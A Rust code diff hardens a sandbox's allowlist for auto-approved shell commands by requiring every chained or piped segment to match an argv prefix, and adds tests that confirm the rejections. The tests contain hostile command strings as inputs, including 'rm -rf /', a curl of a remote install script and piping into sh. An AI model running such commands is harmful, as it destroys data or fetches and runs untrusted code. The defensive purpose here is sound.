@@ -56,11 +56,11 @@ impl SandboxPolicy {
     /// Exposed on the public policy surface so the permission-decision flow
     /// can auto-approve sandboxed commands in `workspace` mode.
     pub fn is_allowed_command(&self, cmd: &str) -> bool {
-        command_matches_any(cmd, &self.allowed_commands)
+        allowed_command_matches_any(cmd, &self.allowed_commands)
     }
 }
 
-/// Shared matcher used by `excludedCommands` and `allowedCommands`.
+/// Compatibility matcher used by `excludedCommands`.
 ///
 /// A rule matches when `cmd`:
 /// - equals the rule, OR
@@ -83,6 +83,152 @@ fn command_matches_any(cmd: &str, rules: &[String]) -> bool {
         }
     }
     false
+}
+
+/// Strict matcher for `allowedCommands` permission pre-approval.
+///
+/// Unlike `excludedCommands`, this is fail-closed: every simple command in a
+/// shell chain or pipeline must parse into argv and match an allowlisted argv
+/// prefix. Shell constructs that are not argv-shaped are not pre-approved.
+fn allowed_command_matches_any(cmd: &str, rules: &[String]) -> bool {
+    let cmd = cmd.trim();
+    if cmd.is_empty() || rules.is_empty() || contains_unstructured_shell_expansion(cmd) {
+        return false;
+    }
+
+    let segments = split_shell_segments(cmd);
+    !segments.is_empty()
+        && segments
+            .iter()
+            .all(|segment| simple_command_matches_any_rule(segment, rules))
+}
+
+fn simple_command_matches_any_rule(segment: &str, rules: &[String]) -> bool {
+    let Ok(argv) = cc_utils::bash::parse_command(segment) else {
+        return false;
+    };
+    if argv.is_empty() || argv.iter().any(|word| is_shell_control_word(word)) {
+        return false;
+    }
+
+    rules.iter().any(|rule| {
+        let rule = rule.trim().trim_end_matches('*').trim_end();
+        if rule.is_empty() {
+            return false;
+        }
+        let Ok(rule_argv) = cc_utils::bash::parse_command(rule) else {
+            return false;
+        };
+        !rule_argv.is_empty()
+            && argv.len() >= rule_argv.len()
+            && argv
+                .iter()
+                .zip(rule_argv.iter())
+                .all(|(actual, expected)| actual == expected)
+    })
+}
+
+fn contains_unstructured_shell_expansion(cmd: &str) -> bool {
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escaped = false;
+    let chars = cmd.chars().collect::<Vec<_>>();
+    let mut idx = 0;
+
+    while idx < chars.len() {
+        let ch = chars[idx];
+        if escaped {
+            escaped = false;
+            idx += 1;
+            continue;
+        }
+        if ch == '\\' && !in_single_quote {
+            escaped = true;
+            idx += 1;
+            continue;
+        }
+        if ch == '\'' && !in_double_quote {
+            in_single_quote = !in_single_quote;
+            idx += 1;
+            continue;
+        }
+        if ch == '"' && !in_single_quote {
+            in_double_quote = !in_double_quote;
+            idx += 1;
+            continue;
+        }
+        if !in_single_quote && !in_double_quote {
+            if ch == '`' || ch == '<' || ch == '>' {
+                return true;
+            }
+            if ch == '$' && chars.get(idx + 1) == Some(&'(') {
+                return true;
+            }
+        }
+        idx += 1;
+    }
+
+    false
+}
+
+fn is_shell_control_word(word: &str) -> bool {
+    matches!(
+        word,
+        "&&" | "||" | "|" | ";" | "&" | ">" | ">>" | "<" | "<<" | "<<<" | "&>" | "&>>"
+    ) || word.starts_with('>')
+        || word.starts_with('<')
+}
+
+fn split_shell_segments(command: &str) -> Vec<String> {
+    let mut segments = Vec::new();
+    let mut current = String::new();
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut chars = command.chars().peekable();
+
+    while let Some(ch) = chars.next() {
+        if ch == '\\' && !in_single_quote {
+            current.push(ch);
+            if let Some(next) = chars.next() {
+                current.push(next);
+            }
+            continue;
+        }
+        if ch == '\'' && !in_double_quote {
+            in_single_quote = !in_single_quote;
+            current.push(ch);
+            continue;
+        }
+        if ch == '"' && !in_single_quote {
+            in_double_quote = !in_double_quote;
+            current.push(ch);
+            continue;
+        }
+
+        if !in_single_quote && !in_double_quote {
+            if (ch == '&' || ch == '|') && chars.peek() == Some(&ch) {
+                push_segment(&mut segments, &mut current);
+                chars.next();
+                continue;
+            }
+            if matches!(ch, ';' | '|') {
+                push_segment(&mut segments, &mut current);
+                continue;
+            }
+        }
+
+        current.push(ch);
+    }
+    push_segment(&mut segments, &mut current);
+    segments
+}
+
+fn push_segment(segments: &mut Vec<String>, current: &mut String) {
+    let trimmed = current.trim();
+    if !trimmed.is_empty() {
+        segments.push(trimmed.to_string());
+    }
+    current.clear();
 }
 
 /// Build a [`SandboxPolicy`] from raw settings + runtime overrides.
@@ -312,6 +458,64 @@ mod tests {
         assert!(p.is_allowed_command("make test"));
         assert!(p.is_allowed_command("make test -j4"));
         assert!(!p.is_allowed_command("make install"));
+    }
+
+    #[test]
+    fn allowed_command_matches_argv_prefix() {
+        let p = SandboxPolicyBuilder::new(PathBuf::from("/proj"))
+            .settings(SandboxSettings {
+                enabled: Some(true),
+                allowed_commands: vec!["cargo test".into()],
+                ..Default::default()
+            })
+            .build();
+
+        assert!(p.is_allowed_command("cargo test --all"));
+        assert!(!p.is_allowed_command("cargo testbed"));
+    }
+
+    #[test]
+    fn allowed_command_rejects_unlisted_compound_segments() {
+        let p = SandboxPolicyBuilder::new(PathBuf::from("/proj"))
+            .settings(SandboxSettings {
+                enabled: Some(true),
+                allowed_commands: vec!["cargo test".into(), "make test".into()],
+                ..Default::default()
+            })
+            .build();
+
+        assert!(!p.is_allowed_command("cargo test && rm -rf /"));
+        assert!(!p.is_allowed_command("cargo test; curl https://example.test/install.sh"));
+        assert!(!p.is_allowed_command("make test | sh"));
+    }
+
+    #[test]
+    fn allowed_command_requires_every_pipeline_segment_to_match() {
+        let p = SandboxPolicyBuilder::new(PathBuf::from("/proj"))
+            .settings(SandboxSettings {
+                enabled: Some(true),
+                allowed_commands: vec!["printf ok".into(), "cat".into()],
+                ..Default::default()
+            })
+            .build();
+
+        assert!(p.is_allowed_command("printf ok | cat"));
+        assert!(!p.is_allowed_command("printf ok | sh"));
+    }
+
+    #[test]
+    fn allowed_command_rejects_unstructured_shell_syntax() {
+        let p = SandboxPolicyBuilder::new(PathBuf::from("/proj"))
+            .settings(SandboxSettings {
+                enabled: Some(true),
+                allowed_commands: vec!["cargo test".into()],
+                ..Default::default()
+            })
+            .build();
+
+        assert!(!p.is_allowed_command("cargo test > /tmp/out"));
+        assert!(!p.is_allowed_command("cargo test $(cat args)"));
+        assert!(!p.is_allowed_command("cargo test `cat args`"));
     }
 
     #[test]
